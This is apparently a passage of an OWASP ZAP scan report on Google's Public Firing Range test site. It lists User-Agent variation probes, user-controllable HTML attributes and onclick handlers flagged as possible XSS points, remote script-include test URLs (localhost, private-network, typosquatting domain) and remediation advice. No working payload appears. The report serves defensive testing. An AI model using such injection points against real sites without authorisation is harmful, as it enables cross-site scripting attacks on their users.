* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/91.0`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `msnbot/1.1 (+http://search.msn.com/msnbot.htm)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/91.0`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16`
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `msnbot/1.1 (+http://search.msn.com/msnbot.htm)`
  * Evidence: ``
  * Other Info: ``

Instances: 48

### Solution



### Reference


* [ https://owasp.org/wstg ](https://owasp.org/wstg)



#### Source ID: 1

### [ User Controllable HTML Element Attribute (Potential XSS) ](https://www.zaproxy.org/docs/alerts/10031/)



##### Informational (Low)

### Description

This check looks at user-supplied input in query string parameters and POST data to identify where certain HTML attribute values might be controlled. This provides hot-spot detection for XSS (cross-site scripting) that will require further review by a security analyst to determine exploitability.

* URL: https://public-firing-range.appspot.com/angular/angular_body_attribute_ng/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:

https://public-firing-range.appspot.com/angular/angular_body_attribute_ng/1.4.0?q=test

appears to include user input in: 

a(n) [div] tag [ng-class] attribute 

The user input found was:
q=test

The user-controlled value was:
test`
* URL: https://public-firing-range.appspot.com/angular/angular_body_attribute_non_ng_raw/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:

https://public-firing-range.appspot.com/angular/angular_body_attribute_non_ng_raw/1.4.0?q=test

appears to include user input in: 

a(n) [div] tag [class] attribute 

The user input found was:
q=test

The user-controlled value was:
test`
* URL: https://public-firing-range.appspot.com/redirect/meta%3Fq=/
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:

https://public-firing-range.appspot.com/redirect/meta?q=/

appears to include user input in: 

a(n) [meta] tag [content] attribute 

The user input found was:
q=/

The user-controlled value was:
0;/`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/object/application_x-shockwave-flash%3Fq=https://google.com
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:

https://public-firing-range.appspot.com/remoteinclude/parameter/object/application_x-shockwave-flash?q=https://google.com

appears to include user input in: 

a(n) [object] tag [data] attribute 

The user input found was:
q=https://google.com

The user-controlled value was:
https://google.com`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/object_raw%3Fq=https://google.com
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:

https://public-firing-range.appspot.com/remoteinclude/parameter/object_raw?q=https://google.com

appears to include user input in: 

a(n) [object] tag [data] attribute 

The user input found was:
q=https://google.com

The user-controlled value was:
https://google.com`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://127.0.0.2/localhost_import.js
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:

https://public-firing-range.appspot.com/remoteinclude/parameter/script?q=http://127.0.0.2/localhost_import.js

appears to include user input in: 

a(n) [script] tag [src] attribute 

The user input found was:
q=http://127.0.0.2/localhost_import.js

The user-controlled value was:
http://127.0.0.2/localhost_import.js`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://192.168.1.2/private_network_import.js
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:

https://public-firing-range.appspot.com/remoteinclude/parameter/script?q=http://192.168.1.2/private_network_import.js

appears to include user input in: 

a(n) [script] tag [src] attribute 

The user input found was:
q=http://192.168.1.2/private_network_import.js

The user-controlled value was:
http://192.168.1.2/private_network_import.js`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://g00gle.com/typosquatting_domain.js
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:

https://public-firing-range.appspot.com/remoteinclude/parameter/script?q=http://g00gle.com/typosquatting_domain.js

appears to include user input in: 

a(n) [script] tag [src] attribute 

The user input found was:
q=http://g00gle.com/typosquatting_domain.js

The user-controlled value was:
http://g00gle.com/typosquatting_domain.js`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=https://google.com
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:

https://public-firing-range.appspot.com/remoteinclude/parameter/script?q=https://google.com

appears to include user input in: 

a(n) [script] tag [src] attribute 

The user input found was:
q=https://google.com

The user-controlled value was:
https://google.com`

Instances: 9

### Solution

Validate all input and sanitize output it before writing to any HTML attributes.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)


#### CWE Id: [ 20 ](https://cwe.mitre.org/data/definitions/20.html)


#### WASC Id: 20

#### Source ID: 3

### [ User Controllable JavaScript Event (XSS) ](https://www.zaproxy.org/docs/alerts/10043/)



##### Informational (Low)

### Description

This check looks at user-supplied input in query string parameters and POST data to identify where certain HTML attribute values might be controlled. This provides hot-spot detection for XSS (cross-site scripting) that will require further review by a security analyst to determine exploitability.

* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled javascript event(s) was found. Exploitability will need to be manually determined. The page at the following URL:

https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_quoted/DOUBLE_QUOTED_ATTRIBUTE?q=a

includes the following Javascript event which may be attacker-controllable: 

User-input was found in the following data of an [onclick] event:
a

The user input was:
a`
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled javascript event(s) was found. Exploitability will need to be manually determined. The page at the following URL:

https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_singlequoted/SINGLE_QUOTED_ATTRIBUTE?q=a

includes the following Javascript event which may be attacker-controllable: 

User-input was found in the following data of an [onclick] event:
a

The user input was:
a`
* URL: https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: ``
  * Evidence: ``
  * Other Info: `User-controlled javascript event(s) was found. Exploitability will need to be manually determined. The page at the following URL:

https://public-firing-range.appspot.com/reflected/escapedparameter/js_eventhandler_unquoted/UNQUOTED_ATTRIBUTE?q=a

includes the following Javascript event which may be attacker-controllable: 

User-input was found in the following data of an [onclick] event:
a

The user input was:
a`

Instances: 3

### Solution

Validate all input and sanitize output it before writing to any Javascript on* events.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)


#### CWE Id: [ 20 ](https://cwe.mitre.org/data/definitions/20.html)


#### WASC Id: 20

#### Source ID: 3


